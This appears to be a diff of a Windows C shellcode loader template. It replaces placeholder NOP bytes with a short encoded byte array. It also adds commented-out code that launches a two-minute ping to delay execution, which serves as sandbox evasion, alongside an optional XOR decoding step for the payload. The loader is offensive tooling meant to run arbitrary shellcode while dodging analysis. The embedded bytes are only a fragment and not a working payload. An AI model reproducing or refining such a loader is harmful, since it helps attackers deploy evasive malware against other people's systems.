@@ -14,7 +14,13 @@ void XorShellcode(IN PBYTE pShellcode, IN SIZE_T dwSize, IN BYTE bKey)
 void ShellcodeLoader()
 {
 	// Insert shellcode here
-	unsigned char shellCode[] = "\x90\x90\x90\x90";
+	unsigned char shellCode[] = "\x95\x21\xea\x8d\x99";
+
+	//uncomment this to run a ping for 2min and delay execution
+	//STARTUPINFOA si = { 0 };
+	//PROCESS_INFORMATION pi = { 0 };
+	//HANDLE hProc = CreateProcessA(NULL, "C:\\Windows\\system32\\PING.exe localhost -n 120", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	//WaitForSingleObject(pi.hProcess, INFINITE);
 
 	// uncomment this to xor your payload before execution
 	//XorShellcode(shellCode, sizeof(shellCode), 0x69);
